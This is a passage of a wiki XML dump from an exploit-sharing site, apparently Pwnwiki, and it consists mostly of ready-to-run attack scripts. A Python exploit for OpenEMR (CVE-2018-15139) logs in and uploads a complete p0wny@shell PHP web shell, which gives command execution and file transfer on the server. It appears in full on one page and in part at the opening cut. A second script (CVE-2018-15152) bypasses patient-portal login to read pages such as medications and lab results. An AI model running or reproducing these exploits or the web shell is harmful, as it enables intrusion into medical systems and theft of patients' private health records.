\"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_dest_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"bn_save\"\r\n\r\nSave\r\n-----------------------------31900464228840324774249185339--\r\n"

# Send Exploit:
session.post(exploit_url, headers=header, data=body)

# Finish
path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
print('[+] Webshell: ' + path)
&lt;/pre&gt;</text>
      <sha1>pi2d44mkadkvek0coft1i1pp74841d5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-15139 OpenEMR 5.0.1.3 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4401</id>
    <revision>
      <id>5069</id>
      <timestamp>2021-06-15T01:30:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-15139 OpenEMR 5.0.1.3 远程代码执行漏洞"</comment>
      <origin>5069</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23258" sha1="agcd9quytih03akf542gson511ninjt" xml:space="preserve">&lt;languages /&gt;

==影响版本==
&lt;pre&gt;
Version: Prior to 5.0.1.4
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
# Date 12.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: Prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15139
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15139

'''
Description:
Unrestricted file upload in interface/super/manage_site_files.php in versions of OpenEMR before 5.0.1.4 allows a remote
authenticated attacker to execute arbitrary PHP code by uploading a file with a PHP extension via the images upload
form and accessing it in the images directory.
'''


'''
Banner:
'''
banner ="""
 ___                   _____ __  __ ____            ____   ___   _   _____  
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /  
 | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_ \  
 | |_| | |_) |  __/ | | | |___| |  | |  _ &lt;  |_____|  ___) | |_| || |_ ___) | 
  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/  
       |_|                                                                    

                    _____            _       _ _   
                    | ____|_  ___ __ | | ___ (_) |_ 
                    |  _| \ \/ / '_ \| |/ _ \| | __|
                    | |___ &gt;  &lt;| |_) | | (_) | | |_ 
                    |_____/_/\_\ .__/|_|\___/|_|\__|
                               |_|                  

"""
print(banner)


'''
Import required modules
'''
import argparse
import requests


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Remote Code Execution')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

'''
Authentication:
'''
# Preparation:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'
auth_chek_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/login/login.php?site=default'
response = session.get(auth_chek_url)

# Header (auth):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': auth_chek_url,
    'Upgrade-Insecure-Requests': '1',
}

# Body (auth):
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authentication:
print('')
print('[+] Authentication')
auth = session.post(auth_url,headers=header, data=body)


'''
Exploit:
'''
print('')
print('[+] Uploading Webshell:')

# URL:
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'

# Headers (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------31900464228840324774249185339",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Referer": 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php',
    "Upgrade-Insecure-Requests": "1"
}

# Body (Exploit):
body = "-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_filedata\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n12000000\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_dest_filename\"\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------31900464228840324774249185339\r\nContent-Disposition: form-data; name=\"bn_save\"\r\n\r\nSave\r\n-----------------------------31900464228840324774249185339--\r\n"

# Send Exploit:
session.post(exploit_url, headers=header, data=body)

# Finish
path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
print('[+] Webshell: ' + path)
&lt;/pre&gt;</text>
      <sha1>agcd9quytih03akf542gson511ninjt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-15152 OpenEMR 5.0.1.3 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>4498</id>
    <revision>
      <id>5176</id>
      <timestamp>2021-06-16T09:28:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: OpenEMR 5.0.1.3 - '/portal/account/register.php' Authentication Bypass # Date 15.06.2021 # Exploit Author: Ron Jost (Hacker5preme) # Vendor Homepage: ht..."</comment>
      <origin>5176</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2673" sha1="67mruaqbp4s8cp5djp4u9y1xpt0p4a2" xml:space="preserve">&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.3 - '/portal/account/register.php' Authentication Bypass
# Date 15.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: All versions prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15152
# CWE: CWE-287
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15152-Exploit

'''
Description:
An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to
the registration page and modifying the requested url to access the desired page. Some
examples of pages in the portal directory that are accessible after browsing to the
registration page include:
- add_edit_event_user.php
- find_appt_popup_user.php
- get_allergies.php
- get_amendments.php
- get_lab_results.php
- get_medications.php
- get_patient_documents.php
- get_problems.php
- get_profile.php
- portal_payment.php
- messaging/messages.php
- messaging/secure_chat.php
- report/pat_ledger.php
- report/portal_custom_report.php
- report/portal_patient_report.php
Normally, access to these pages requires authentication as a patient. If a user were to visit
any of those pages unauthenticated, they would be redirected to the login page.
'''


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Authentication bypass')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--Openemrpath', type=str)
my_parser.add_argument('-R', '--PathToGet', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.Openemrpath
pathtoread = args.PathToGet


'''
Check for vulnerability:
'''
# Check, if Registration portal is enabled. If it is not, this exploit can not work
session = requests.Session()
check_vuln_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/portal/account/register.php'
check_vuln = session.get(check_vuln_url).text
print('')
print('[*] Checking vulnerability: ')
print('')

if "Enter email address to receive registration." in check_vuln:
    print('[+] Host Vulnerable. Proceeding exploit')
else:
    print('[-] Host is not Vulnerable: Registration for patients is not enabled')

'''
Exploit:
'''
header = {
    'Referer': check_vuln_url
}
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + pathtoread
Exploit = session.get(exploit_url, headers=header)
print('')
print('[+] Results: ')
print('')
print(Exploit.text)
print('')
&lt;/pre&gt;</text>
      <sha1>67mruaqbp4s8cp5djp4u9y1xpt0p4a2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-15745 Argus Surveillance DVR 4.0.0.0目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>481</id>
    <revision>
      <id>683</id>
      <timestamp>2021-03-27T02:48:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
